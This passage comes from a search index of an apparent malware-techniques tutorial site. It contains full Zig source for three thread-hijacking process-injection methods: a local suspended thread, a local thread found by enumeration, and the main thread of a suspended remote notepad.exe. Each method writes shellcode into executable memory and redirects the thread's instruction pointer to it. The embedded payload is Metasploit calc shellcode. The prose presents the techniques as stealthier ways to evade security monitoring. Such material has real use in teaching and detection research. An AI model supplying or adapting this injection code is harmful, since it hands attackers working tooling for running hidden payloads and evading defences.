std.mem.zeroes(CONTEXT);\n    ThreadCtx.ContextFlags = CONTEXT_CONTROL;\n\n    // NOTE:\n    // In Zig, there's no implicit initialization like C, so we need\n    // to manually set all other fields to be 0. While in C, the uninitialized\n    // fields will be automatically set to 0.\n    //\n    // NOTE:\n    // Reference C99 Standard 6.7.8.21:\n    // If there are fewer initializers in a brace-enclosed list than there are\n    // elements or members of an aggregate, or fewer characters in a string\n    // literal used to initialize an array of known size than there are elements\n    // in the array, the remainder of the aggregate shall be initialized implicitly\n    // the same as objects that have static storage duration.\n    //\n    // NOTE: So the ThreadCtx above is equals to this:\n    // var ThreadCtx = CONTEXT{\n    //     .ContextFlags = CONTEXT_CONTROL,\n    //     .P1Home = 0,\n    //     .P2Home = 0,\n    //     .P3Home = 0,\n    //     .P4Home = 0,\n    //     .P5Home = 0,\n    //     .P6Home = 0,\n    //     .MxCsr = 0,\n    //     .SegCs = 0,\n    //     .SegDs = 0,\n    //     .SegEs = 0,\n    //     .SegFs = 0,\n    //     .SegGs = 0,\n    //     .SegSs = 0,\n    //     .EFlags = 0,\n    //     .Dr0 = 0,\n    //     .Dr1 = 0,\n    //     .Dr2 = 0,\n    //     .Dr3 = 0,\n    //     .Dr6 = 0,\n    //     .Dr7 = 0,\n    //     .Rax = 0,\n    //     .Rcx = 0,\n    //     .Rdx = 0,\n    //     .Rbx = 0,\n    //     .Rsp = 0,\n    //     .Rbp = 0,\n    //     .Rsi = 0,\n    //     .Rdi = 0,\n    //     .R8 = 0,\n    //     .R9 = 0,\n    //     .R10 = 0,\n    //     .R11 = 0,\n    //     .R12 = 0,\n    //     .R13 = 0,\n    //     .R14 = 0,\n    //     .R15 = 0,\n    //     .Rip = 0,\n    //     .FltSave = std.mem.zeroes([512]u8),\n    //     .VectorRegister = std.mem.zeroes([26][16]u8),\n    //     .VectorControl = 0,\n    //     .DebugControl = 0,\n    //     .LastBranchToRip = 0,\n    //     .LastBranchFromRip = 0,\n    //     .LastExceptionToRip = 0,\n    //     .LastExceptionFromRip = 0,\n    // };\n\n    // Allocating memory for the payload\n    const payload_size_dword: DWORD = @intCast(pPayload.len); // This is for adapting Win API param size\n    pAddress = VirtualAlloc(null, payload_size_dword, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (pAddress == null) {\n        print(\"[!] VirtualAlloc Failed With Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    // Copying the payload to the allocated memory\n    const dest = @as([*]u8, @ptrCast(pAddress.?))[0..pPayload.len];\n    @memcpy(dest, pPayload);\n\n    // Changing the memory protection\n    if (VirtualProtect(pAddress.?, payload_size_dword, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection) == 0) {\n        print(\"[!] VirtualProtect Failed With Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    // Getting the original thread context\n    if (GetThreadContext(hThread, &amp;ThreadCtx) == 0) {\n        print(\"[!] GetThreadContext Failed With Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    // Updating the next instruction pointer to be equal to the payload's address\n    ThreadCtx.Rip = @intFromPtr(pAddress.?);\n\n    // in case of a x64 payload injection : we change the value of `Rip`\n    // in case of a x32 payload injection : we change the value of `Eip`\n\n    // Setting the new updated thread context\n    if (SetThreadContext(hThread, &amp;ThreadCtx) == 0) {\n        print(\"[!] SetThreadContext Failed With Error : {d}\\n\", .{GetLastError()});\n        return false;\n    }\n\n    return true;\n}\n\n// Wait for user input (equivalent to getchar())\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\n// Main function (equivalent to C main)\npub fn main() !void {\n    var hThread: ?HANDLE = null;\n    var dwThreadId: DWORD = 0;\n\n    // Creating sacrificial thread in suspended state\n    //\n    // NOTE:\n    // We can also use SuspendThread to suspend a thread.\n    // To lean more: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread\n    hThread = CreateThread(null, 0, &amp;DummyFunction, null, CREATE_SUSPENDED, &amp;dwThreadId);\n    if (hThread == null) {\n        print(\"[!] CreateThread Failed With Error : {d}\\n\", .{GetLastError()});\n        return;\n    }\n\n    print(\"[i] Hijacking Thread Of Id : {d}\\n\", .{dwThreadId});\n\n    // Hijacking the sacrificial thread created\n    if (!runViaClassicThreadHijacking(hThread.?, &amp;calc_payload)) {\n        _ = CloseHandle(hThread.?);\n        return;\n    }\n    print(\"[+] DONE\\n\", .{});\n    print(\"[#] Press &lt;Enter&gt; To Run The Payload ...\", .{});\n    waitForEnter();\n\n    // Resuming suspended thread, so that it runs our shellcode\n    _ = ResumeThread(hThread.?);\n\n    // Wait for the thread to complete\n    _ = WaitForSingleObject(hThread.?, INFINITE);\n\n    print(\"[#] Press &lt;Enter&gt; To Quit...\", .{});\n    waitForEnter();\n\n    // Cleanup\n    _ = CloseHandle(hThread.?);\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/local_thread_enumeration/","title":"Local Thread Enumeration","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/local_thread_enumeration/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>This sample enumerates all threads running in the current process and hijacks one of them to execute the shellcode. Because a minimal Zig program only starts a single main thread, the code first spawns a dummy worker thread that simply sleeps in an infinite loop. Enumeration via <code>CreateToolhelp32Snapshot</code> then locates this worker so we can safely open its handle and modify its context. The C version of this technique usually finds other threads already present, so no extra thread is needed.</p> <p>Hijacking a thread discovered through enumeration keeps its original start address and stack, which helps the thread blend in with legitimate activity. Using the created worker purely as bait allows the injected payload to run inside a thread that looks authentic, rather than in a newly created thread that clearly begins at suspicious code.</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/local_thread_enumeration/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst print = std.debug.print;\nconst windows = std.os.windows;\nconst WINAPI = windows.WINAPI;\n\n// Windows API constants\nconst TH32CS_SNAPTHREAD: u32 = 0x00000004;\nconst THREAD_ALL_ACCESS: u32 = 0x001FFFFF;\nconst CONTEXT_ALL: u32 = 0x001003FF;\nconst MEM_COMMIT: u32 = windows.MEM_COMMIT;\nconst MEM_RESERVE: u32 = windows.MEM_RESERVE;\nconst PAGE_READWRITE: u32 = windows.PAGE_READWRITE;\nconst PAGE_EXECUTE_READWRITE: u32 = windows.PAGE_EXECUTE_READWRITE;\nconst INFINITE: u32 = windows.INFINITE;\nconst DWORD = windows.DWORD;\n\n// THREADENTRY32 structure\nconst THREADENTRY32 = extern struct {\n    dwSize: u32,\n    cntUsage: u32,\n    th32ThreadID: u32,\n    th32OwnerProcessID: u32,\n    tpBasePri: i32,\n    tpDeltaPri: i32,\n    dwFlags: u32,\n};\n\n// Thread context structure for x64\nconst CONTEXT = extern struct {\n    // Register parameter home addresses (reserved for debugger use)\n    P1Home: u64,\n    P2Home: u64,\n    P3Home: u64,\n    P4Home: u64,\n    P5Home: u64,\n    P6Home: u64,\n\n    // Control flags\n    ContextFlags: DWORD,\n    MxCsr: DWORD,\n\n    // Segment registers and processor flags\n    SegCs: u16,\n    SegDs: u16,\n    SegEs: u16,\n    SegFs: u16,\n    SegGs: u16,\n    SegSs: u16,\n    EFlags: DWORD,\n\n    // Debug registers\n    Dr0: u64,\n    Dr1: u64,\n    Dr2: u64,\n    Dr3: u64,\n    Dr6: u64,\n    Dr7: u64,\n\n    // Integer registers\n    Rax: u64,\n    Rcx: u64,\n    Rdx: u64,\n    Rbx: u64,\n    Rsp: u64,\n    Rbp: u64,\n    Rsi: u64,\n    Rdi: u64,\n    R8: u64,\n    R9: u64,\n    R10: u64,\n    R11: u64,\n    R12: u64,\n    R13: u64,\n    R14: u64,\n    R15: u64,\n\n    // Program counter\n    Rip: u64,\n\n    // Floating point state\n    FltSave: [512]u8, // XMM_SAVE_AREA32\n\n    // Vector registers\n    VectorRegister: [26][16]u8,\n    VectorControl: u64,\n\n    // Special debug control registers\n    DebugControl: u64,\n    LastBranchToRip: u64,\n    LastBranchFromRip: u64,\n    LastExceptionToRip: u64,\n    LastExceptionFromRip: u64,\n};\n\n// External Windows API functions\nextern \"kernel32\" fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) callconv(WINAPI) windows.HANDLE;\nextern \"kernel32\" fn Thread32First(hSnapshot: windows.HANDLE, lpte: *THREADENTRY32) callconv(WINAPI) i32;\nextern \"kernel32\" fn Thread32Next(hSnapshot: windows.HANDLE, lpte: *THREADENTRY32) callconv(WINAPI) i32;\nextern \"kernel32\" fn OpenThread(dwDesiredAccess: u32, bInheritHandle: i32, dwThreadId: u32) callconv(WINAPI) windows.HANDLE;\nextern \"kernel32\" fn GetCurrentProcessId() callconv(WINAPI) u32;\nextern \"kernel32\" fn GetCurrentThreadId() callconv(WINAPI) u32;\nextern \"kernel32\" fn VirtualAlloc(lpAddress: ?*anyopaque, dwSize: usize, flAllocationType: u32, flProtect: u32) callconv(WINAPI) ?*anyopaque;\nextern \"kernel32\" fn VirtualProtect(lpAddress: *anyopaque, dwSize: usize, flNewProtect: u32, lpflOldProtect: *u32) callconv(WINAPI) i32;\nextern \"kernel32\" fn SuspendThread(hThread: windows.HANDLE) callconv(WINAPI) u32;\nextern \"kernel32\" fn ResumeThread(hThread: windows.HANDLE) callconv(WINAPI) u32;\nextern \"kernel32\" fn GetThreadContext(hThread: windows.HANDLE, lpContext: *CONTEXT) callconv(WINAPI) i32;\nextern \"kernel32\" fn SetThreadContext(hThread: windows.HANDLE, lpContext: *const CONTEXT) callconv(WINAPI) i32;\nextern \"kernel32\" fn WaitForSingleObject(hHandle: windows.HANDLE, dwMilliseconds: u32) callconv(WINAPI) u32;\nextern \"kernel32\" fn CreateThread(lpThreadAttributes: ?*anyopaque, dwStackSize: usize, lpStartAddress: *const fn (?*anyopaque) callconv(WINAPI) u32, lpParameter: ?*anyopaque, dwCreationFlags: u32, lpThreadId: ?*u32) callconv(WINAPI) ?windows.HANDLE;\n\n// x64 calc metasploit shellcode\nconst payload = [_]u8{\n    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,\n    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,\n    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,\n    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,\n    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,\n    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,\n    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,\n    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,\n    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,\n    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,\n    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,\n    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,\n    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,\n    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,\n    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,\n    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,\n    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,\n    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,\n    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,\n    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,\n    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,\n    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,\n};\n\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\n// Worker thread function that just sleeps\nfn workerThreadFunction(param: ?*anyopaque) callconv(WINAPI) u32 {\n    _ = param;\n    // Keep the thread alive so we can hijack it\n    while (true) {\n        std.time.sleep(100 * std.time.ns_per_ms);\n    }\n    return 0;\n}\n\nfn getLocalThreadHandle(main_thread_id: u32, thread_id: *u32, thread_handle: *windows.HANDLE) bool {\n    const process_id = GetCurrentProcessId();\n    print(\"\\t[i] Current Process ID: {}\\n\", .{process_id});\n    print(\"\\t[i] Main Thread ID: {}\\n\", .{main_thread_id});\n\n    const snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n    if (snapshot == windows.INVALID_HANDLE_VALUE) {\n        print(\"\\n\\t[!] CreateToolhelp32Snapshot Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return false;\n    }\n    defer windows.CloseHandle(snapshot);\n\n    var thread_entry = THREADENTRY32{\n        .dwSize = @sizeOf(THREADENTRY32),\n        .cntUsage = 0,\n        .th32ThreadID = 0,\n        .th32OwnerProcessID = 0,\n        .tpBasePri = 0,\n        .tpDeltaPri = 0,\n        .dwFlags = 0,\n    };\n\n    if (Thread32First(snapshot, &amp;thread_entry) == 0) {\n        print(\"\\n\\t[!] Thread32First Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return false;\n    }\n\n    var thread_count: u32 = 0;\n    while (true) {\n        if (thread_entry.th32OwnerProcessID == process_id) {\n            thread_count += 1;\n            if (thread_entry.th32ThreadID != main_thread_id) {\n                thread_id.* = thread_entry.th32ThreadID;\n                thread_handle.* = OpenThread(THREAD_ALL_ACCESS, 0, thread_entry.th32ThreadID);\n\n                if (thread_handle.* == windows.INVALID_HANDLE_VALUE) {\n                    print(\"\\n\\t[!] OpenThread Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n                } else {\n                    print(\"\\t[i] Successfully opened thread handle\\n\", .{});\n                    return true;\n                }\n            }\n        }\n\n        if (Thread32Next(snapshot, &amp;thread_entry) == 0) {\n            break;\n        }\n    }\n\n    print(\"\\t[i] Total threads found in current process: {}\\n\", .{thread_count});\n    return false;\n}\n\nfn injectShellcodeToLocalProcess(shellcode: []const u8, address: *?*anyopaque) bool {\n    var old_protection: u32 = 0;\n\n    address.* = VirtualAlloc(null, shellcode.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (address.* == null) {\n        print(\"\\t[!] VirtualAlloc Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return false;\n    }\n    print(\"\\t[i] Allocated Memory At: 0x{X}\\n\", .{@intFromPtr(address.*.?)});\n\n    print(\"\\t[#] Press &lt;Enter&gt; To Write Payload ... \", .{});\n    waitForEnter();\n\n    const dest = @as([*]u8, @ptrCast(address.*.?))[0..shellcode.len];\n    @memcpy(dest, shellcode);\n\n    if (VirtualProtect(address.*.?, shellcode.len, PAGE_EXECUTE_READWRITE, &amp;old_protection) == 0) {\n        print(\"\\t[!] VirtualProtect Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return false;\n    }\n\n    return true;\n}\n\nfn hijackThread(thread_handle: windows.HANDLE, address: *anyopaque) bool {\n    var thread_ctx = std.mem.zeroes(CONTEXT);\n    thread_ctx.ContextFlags = CONTEXT_ALL;\n\n    // Suspend the thread\n    const suspend_result = SuspendThread(thread_handle);\n    if (suspend_result == 0xFFFFFFFF) {\n        print(\"\\t[!] SuspendThread Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return false;\n    }\n\n    if (GetThreadContext(thread_handle, &amp;thread_ctx) == 0) {\n        print(\"\\t[!] GetThreadContext Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return false;\n    }\n\n    thread_ctx.Rip = @intFromPtr(address);\n\n    if (SetThreadContext(thread_handle, &amp;thread_ctx) == 0) {\n        print(\"\\t[!] SetThreadContext Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return false;\n    }\n\n    print(\"\\t[#] Press &lt;Enter&gt; To Run ... \", .{});\n    waitForEnter();\n\n    _ = ResumeThread(thread_handle);\n    _ = WaitForSingleObject(thread_handle, INFINITE);\n\n    return true;\n}\n\n// Your existing functions stay the same, just add this new function:\nfn createWorkerThread() !void {\n    print(\"[i] Creating Worker Thread...\\n\", .{});\n\n    const thread_handle = CreateThread(null, 0, workerThreadFunction, null, 0, null);\n    if (thread_handle == null) {\n        print(\"\\t[!] CreateThread Failed With Error: {}\\n\", .{windows.kernel32.GetLastError()});\n        return error.ThreadCreationFailed;\n    }\n\n    // Give the thread time to start\n    std.time.sleep(200 * std.time.ns_per_ms);\n    print(\"\\t[i] Worker Thread Created Successfully\\n\", .{});\n    print(\"[+] DONE\\n\\n\", .{});\n}\n\npub fn main() !void {\n    var thread_handle: windows.HANDLE = undefined;\n    var main_thread_id: u32 = 0;\n    var thread_id: u32 = 0;\n    var address: ?*anyopaque = null;\n\n    // Create a worker thread first\n    try createWorkerThread();\n\n    // Getting the main thread id\n    main_thread_id = GetCurrentThreadId();\n\n    print(\"[i] Searching For A Thread Under The Local Process ...\\n\", .{});\n    if (!getLocalThreadHandle(main_thread_id, &amp;thread_id, &amp;thread_handle)) {\n        print(\"[!] No Thread is Found\\n\", .{});\n        return;\n    }\n    print(\"\\t[i] Found Target Thread Of Id: {}\\n\", .{thread_id});\n    print(\"[+] DONE\\n\\n\", .{});\n\n    print(\"[i] Writing Shellcode To The Local Process ...\\n\", .{});\n    if (!injectShellcodeToLocalProcess(&amp;payload, &amp;address)) {\n        return;\n    }\n    print(\"[+] DONE\\n\\n\", .{});\n\n    print(\"[i] Hijacking The Target Thread To Run Our Shellcode ...\\n\", .{});\n    if (!hijackThread(thread_handle, address.?)) {\n        return;\n    }\n    print(\"[+] DONE\\n\\n\", .{});\n\n    print(\"[#] Press &lt;Enter&gt; To Quit ... \", .{});\n    waitForEnter();\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/remote_thread_creation/","title":"Remote Thread Creation","text":""},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/remote_thread_creation/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Remote thread creation in this context refers to injecting shellcode into a thread of a remote process. Rather than creating a new thread with <code>CreateRemoteThread</code>, this technique creates a suspended remote process using <code>CreateProcessA</code> with <code>CREATE_SUSPENDED</code>, then uses <code>GetThreadContext</code>, <code>SetThreadContext</code>, and <code>ResumeThread</code> to hijack and redirect execution of its main thread to injected shellcode. This method is stealthier than traditional remote thread creation because it avoids APIs typically monitored by security software (<code>CreateRemoteThread</code> in this case).</p>"},{"location":"Advanced-Malware-Techniques/Process-Injection/Thread-Hijacking/remote_thread_creation/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst print = std.debug.print;\n\n// Windows API types\nconst HANDLE = windows.HANDLE;\nconst DWORD = windows.DWORD;\nconst BOOL = windows.BOOL;\nconst PVOID = windows.PVOID;\nconst LPVOID = windows.LPVOID;\nconst LPCVOID = windows.LPCVOID;\nconst LPCSTR = windows.LPCSTR;\nconst LPSTR = windows.LPSTR;\nconst CHAR = windows.CHAR;\nconst PBYTE = [*]u8;\nconst SIZE_T = windows.SIZE_T;\nconst WINAPI = windows.WINAPI;\nconst PROCESS_INFORMATION = windows.PROCESS_INFORMATION;\n\n// Constants\nconst MAX_PATH: DWORD = 260;\nconst TARGET_PROCESS = \"notepad.exe\";\n\n// Memory protection constants\nconst PAGE_READWRITE: DWORD = windows.PAGE_READWRITE;\nconst PAGE_EXECUTE_READWRITE: DWORD = windows.PAGE_EXECUTE_READWRITE;\nconst MEM_COMMIT: DWORD = windows.MEM_COMMIT;\nconst MEM_RESERVE: DWORD = windows.MEM_RESERVE;\n\n// Process/Thread creation constants\nconst CREATE_SUSPENDED: DWORD = 0x00000004;\nconst INFINITE: DWORD = 0xFFFFFFFF;\n\n// Context flags - exact values from Windows SDK\nconst CONTEXT_i386: DWORD = 0x00010000;\nconst CONTEXT_AMD64: DWORD = 0x00100000;\nconst CONTEXT_CONTROL: DWORD = CONTEXT_AMD64 | 0x00000001;\nconst CONTEXT_INTEGER: DWORD = CONTEXT_AMD64 | 0x00000002;\nconst CONTEXT_SEGMENTS: DWORD = CONTEXT_AMD64 | 0x00000004;\nconst CONTEXT_FLOATING_POINT: DWORD = CONTEXT_AMD64 | 0x00000008;\nconst CONTEXT_DEBUG_REGISTERS: DWORD = CONTEXT_AMD64 | 0x00000010;\nconst CONTEXT_FULL: DWORD = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_FLOATING_POINT;\nconst CONTEXT_ALL: DWORD = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS;\n\n// Exact Windows x64 CONTEXT structure with proper alignment\nconst CONTEXT = extern struct {\n    // Register parameter home addresses (reserved for debugger use)\n    P1Home: u64,\n    P2Home: u64,\n    P3Home: u64,\n    P4Home: u64,\n    P5Home: u64,\n    P6Home: u64,\n\n    // Control flags\n    ContextFlags: DWORD,\n    MxCsr: DWORD,\n\n    // Segment registers and processor flags\n    SegCs: u16,\n    SegDs: u16,\n    SegEs: u16,\n    SegFs: u16,\n    SegGs: u16,\n    SegSs: u16,\n    EFlags: DWORD,\n\n    // Debug registers\n    Dr0: u64,\n    Dr1: u64,\n    Dr2: u64,\n    Dr3: u64,\n    Dr6: u64,\n    Dr7: u64,\n\n    // Integer registers\n    Rax: u64,\n    Rcx: u64,\n    Rdx: u64,\n    Rbx: u64,\n    Rsp: u64,\n    Rbp: u64,\n    Rsi: u64,\n    Rdi: u64,\n    R8: u64,\n    R9: u64,\n    R10: u64,\n    R11: u64,\n    R12: u64,\n    R13: u64,\n    R14: u64,\n    R15: u64,\n\n    // Program counter\n    Rip: u64,\n\n    // Floating point state\n    FltSave: [512]u8, // XMM_SAVE_AREA32\n\n    // Vector registers\n    VectorRegister: [26][16]u8,\n    VectorControl: u64,\n\n    // Special debug control registers\n    DebugControl: u64,\n    LastBranchToRip: u64,\n    LastBranchFromRip: u64,\n    LastExceptionToRip: u64,\n    LastExceptionFromRip: u64,\n};\n\n// STARTUPINFO structure for CreateProcess\nconst STARTUPINFOA = extern struct {\n    cb: DWORD,\n    lpReserved: ?LPSTR,\n    lpDesktop: ?LPSTR,\n    lpTitle: ?LPSTR,\n    dwX: DWORD,\n    dwY: DWORD,\n    dwXSize: DWORD,\n    dwYSize: DWORD,\n    dwXCountChars: DWORD,\n    dwYCountChars: DWORD,\n    dwFillAttribute: DWORD,\n    dwFlags: DWORD,\n    wShowWindow: u16,\n    cbReserved2: u16,\n    lpReserved2: ?*u8,\n    hStdInput: HANDLE,\n    hStdOutput: HANDLE,\n    hStdError: HANDLE,\n};\n\n// External function declarations\nextern \"kernel32\" fn GetEnvironmentVariableA(\n    lpName: LPCSTR,\n    lpBuffer: LPSTR,\n    nSize: DWORD,\n) callconv(WINAPI) DWORD;\n\nextern \"kernel32\" fn CreateProcessA(\n    lpApplicationName: ?LPCSTR,\n    lpCommandLine: ?LPSTR,\n    lpProcessAttributes: ?*anyopaque,\n    lpThreadAttributes: ?*anyopaque,\n    bInheritHandles: BOOL,\n    dwCreationFlags: DWORD,\n    lpEnvironment: ?*anyopaque,\n    lpCurrentDirectory: ?LPCSTR,\n    lpStartupInfo: *STARTUPINFOA,\n    lpProcessInformation: *PROCESS_INFORMATION,\n) callconv(WINAPI) BOOL;\n\nextern \"kernel32\" fn VirtualAllocEx(\n    hProcess: HANDLE,\n    lpAddress: ?LPVOID,\n    dwSize: SIZE_T,\n    flAllocationType: DWORD,\n    flProtect: DWORD,\n) callconv(WINAPI) ?LPVOID;\n\nextern \"kernel32\" fn WriteProcessMemory(\n    hProcess: HANDLE,\n    lpBaseAddress: LPVOID,\n    lpBuffer: LPCVOID,\n    nSize: SIZE_T,\n    lpNumberOfBytesWritten: ?*SIZE_T,\n) callconv(WINAPI) BOOL;\n\nextern \"kernel32\" fn VirtualProtectEx(\n    hProcess: HANDLE,\n    lpAddress: LPVOID,\n    dwSize: SIZE_T,\n    flNewProtect: DWORD,\n    lpflOldProtect: *DWORD,\n) callconv(WINAPI) BOOL;\n\nextern \"kernel32\" fn GetThreadContext(\n    hThread: HANDLE,\n    lpContext: *CONTEXT,\n) callconv(WINAPI) BOOL;\n\nextern \"kernel32\" fn SetThreadContext(\n    hThread: HANDLE,\n    lpContext: *const CONTEXT,\n) callconv(WINAPI) BOOL;\n\nextern \"kernel32\" fn ResumeThread(hThread: HANDLE) callconv(WINAPI) DWORD;\nextern \"kernel32\" fn WaitForSingleObject(hHandle: HANDLE, dwMilliseconds: DWORD) callconv(WINAPI) DWORD;\nextern \"kernel32\" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;\nextern \"kernel32\" fn GetLastError() callconv(WINAPI) DWORD;\n\n// Payload - same calc shellcode\nconst calc_payload = [_]u8{ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00 };\n\n// Wait for user input\nfn waitForEnter(message: []const u8) void {\n    print(\"{s}\", .{message});\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\n// Create suspended process function\nfn createSuspendedProcess(lpProcessName: LPCSTR, dwProcessId: *DWORD, hProcess: *HANDLE, hThread: *HANDLE) bool {\n    var lpPath: [MAX_PATH 